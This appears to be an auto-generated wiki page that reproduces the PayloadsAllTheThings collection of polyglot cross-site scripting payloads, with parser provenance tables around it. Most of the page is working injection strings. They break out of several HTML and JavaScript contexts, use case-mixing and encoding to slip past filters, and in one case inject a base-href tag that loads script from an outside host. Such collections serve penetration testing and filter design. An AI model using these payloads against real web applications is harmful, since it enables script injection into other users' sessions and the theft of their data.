---
parsed_by: focuslocust
source: payloadsallthethings
type: generated
---
# Polyglot XSS

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `payloadsallthethings` |
| Type | `payload-topic` |
| Record ID | `patt-xss-injection-2-xss-polyglot` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/payloadsallthethings/XSS Injection/2 - XSS Polyglot.md` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Generated Concept Page

- [Polyglot XSS](../../topics/xss-injection/polyglot-xss.md)

## Extracted Fields

| Field | Value |
| --- | --- |
| id | patt-xss-injection-2-xss-polyglot |
| name | Polyglot XSS |
| type | payload-topic |
| source | payloadsallthethings |
| url | https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSS%20Injection/2%20-%20XSS%20Polyglot.md |

## Preserved Source Material

````yaml
_body: "# Polyglot XSS\n\nA polyglot XSS is a type of cross-site scripting (XSS) payload designed to work across multiple\
  \ contexts within a web application, such as HTML, JavaScript, and attributes. It exploits the application’s inability to\
  \ properly sanitize input in different parsing scenarios.\n\n* Polyglot XSS - 0xsobky\n\n    ```javascript\n    jaVasCript:/*-/*`/*\\\
  `/*'/*\"/**/(/* */oNcliCk=alert() )//%0D%0A%0D%0A//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>\\\
  x3e\n    ```\n\n* Polyglot XSS - Ashar Javed\n\n    ```javascript\n    \">><marquee><img src=x onerror=confirm(1)></marquee>\"\
  \ ></plaintext\\></|\\><plaintext/onmouseover=prompt(1) ><script>prompt(1)</script>@gmail.com<isindex formaction=javascript:alert(/XSS/)\
  \ type=submit>'-->\" ></script><script>alert(1)</script>\"><img/id=\"confirm&lpar; 1)\"/alt=\"/\"src=\"/\"onerror=eval(id&%23x29;>'\"\
  ><img src=\"http: //i.imgur.com/P8mL8.jpg\">\n    ```\n\n* Polyglot XSS - Mathias Karlsson\n\n    ```javascript\n    \"\
  \ onclick=alert(1)//<button ‘ onclick=alert(1)//> */ alert(1)//\n    ```\n\n* Polyglot XSS - Rsnake\n\n    ```javascript\n\
  \    ';alert(String.fromCharCode(88,83,83))//';alert(String. fromCharCode(88,83,83))//\";alert(String.fromCharCode (88,83,83))//\"\
  ;alert(String.fromCharCode(88,83,83))//-- ></SCRIPT>\">'><SCRIPT>alert(String.fromCharCode(88,83,83)) </SCRIPT>\n    ```\n\
  \n* Polyglot XSS - Daniel Miessler\n\n    ```javascript\n    ';alert(String.fromCharCode(88,83,83))//';alert(String.fromCharCode(88,83,83))//\"\
  ;alert(String.fromCharCode(88,83,83))//\";alert(String.fromCharCode(88,83,83))//--></SCRIPT>\">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>\n\
  \    “ onclick=alert(1)//<button ‘ onclick=alert(1)//> */ alert(1)//\n    '\">><marquee><img src=x onerror=confirm(1)></marquee>\"\
  ></plaintext\\></|\\><plaintext/onmouseover=prompt(1)><script>prompt(1)</script>@gmail.com<isindex formaction=javascript:alert(/XSS/)\
  \ type=submit>'-->\"></script><script>alert(1)</script>\"><img/id=\"confirm&lpar;1)\"/alt=\"/\"src=\"/\"onerror=eval(id&%23x29;>'\"\
  ><img src=\"http://i.imgur.com/P8mL8.jpg\">\n    javascript://'/</title></style></textarea></script>--><p\" onclick=alert()//>*/alert()/*\n\
  \    javascript://--></script></title></style>\"/</textarea>*/<alert()/*' onclick=alert()//>a\n    javascript://</title>\"\
  /</script></style></textarea/-->*/<alert()/*' onclick=alert()//>/\n    javascript://</title></style></textarea>--></script><a\"\
  //' onclick=alert()//>*/alert()/*\n    javascript://'//\" --></textarea></style></script></title><b onclick= alert()//>*/alert()/*\n\
  \    javascript://</title></textarea></style></script --><li '//\" '*/alert()/*', onclick=alert()//\n    javascript:alert()//--></script></textarea></style></title><a\"\
  //' onclick=alert()//>*/alert()/*\n    --></script></title></style>\"/</textarea><a' onclick=alert()//>*/alert()/*\n   \
  \ /</title/'/</style/</script/</textarea/--><p\" onclick=alert()//>*/alert()/*\n    javascript://--></title></style></textarea></script><svg\
  \ \"//' onclick=alert()//\n    /</title/'/</style/</script/--><p\" onclick=alert()//>*/alert()/*\n    ```\n\n* Polyglot\
  \ XSS - [@s0md3v](https://twitter.com/s0md3v/status/966175714302144514)\n    ![https://pbs.twimg.com/media/DWiLk3UX4AE0jJs.jpg](https://pbs.twimg.com/media/DWiLk3UX4AE0jJs.jpg)\n\
  \n    ```javascript\n    -->'\"/></sCript><svG x=\">\" onload=(co\\u006efirm)``>\n    ```\n\n    ![https://pbs.twimg.com/media/DWfIizMVwAE2b0g.jpg:large](https://pbs.twimg.com/media/DWfIizMVwAE2b0g.jpg:large)\n\
  \n    ```javascript\n    <svg%0Ao%00nload=%09((pro\\u006dpt))()//\n    ```\n\n* Polyglot XSS - from [@filedescriptor's Polyglot\
  \ Challenge](https://web.archive.org/web/20190617111911/https://polyglot.innerht.ml/)\n\n    ```javascript\n    // Author:\
  \ crlf\n    javascript:\"/*'/*`/*--></noscript></title></textarea></style></template></noembed></script><html \\\" onmouseover=/*&lt;svg/*/onload=alert()//>\n\
  \n    // Author: europa\n    javascript:\"/*'/*`/*\\\" /*</title></style></textarea></noscript></noembed></template></script/-->&lt;svg/onload=/*<html/*/onmouseover=alert()//>\n\
  \n    // Author: EdOverflow\n    javascript:\"/*\\\"/*`/*' /*</template></textarea></noembed></noscript></title></style></script>-->&lt;svg\
  \ onload=/*<html/*/onmouseover=alert()//>\n\n    // Author: h1/ragnar\n    javascript:`//\"//\\\"//</title></textarea></style></noscript></noembed></script></template>&lt;svg/onload='/*--><html\
  \ */ onmouseover=alert()//'>`\n    ```\n\n* Polyglot XSS - from [brutelogic](https://brutelogic.com.br/blog/building-xss-polyglots/)\n\
  \n    ```javascript\n    JavaScript://%250Aalert?.(1)//'/*\\'/*\"/*\\\"/*`/*\\`/*%26apos;)/*<!--></Title/</Style/</Script/</textArea/</iFrame/</noScript>\\\
  74k<K/contentEditable/autoFocus/OnFocus=/*${/*/;{/**/(alert)(1)}//><Base/Href=//X55.is\\76-->\n    ```\n\n## References\n\
  \n* [Building XSS Polyglots - Brute - June 23, 2021](https://web.archive.org/web/20210623151016/https://brutelogic.com.br/blog/building-xss-polyglots/)\n\
  * [XSS Polyglot Challenge v2 - @filedescriptor - August 20, 2015](https://web.archive.org/web/20190617111911/https://polyglot.innerht.ml/)"
_relative_path: XSS Injection/2 - XSS Polyglot.md
_source_path: /home/adams/scorchederf/focuslocust/.cache/payloadsallthethings/XSS Injection/2 - XSS Polyglot.md
````
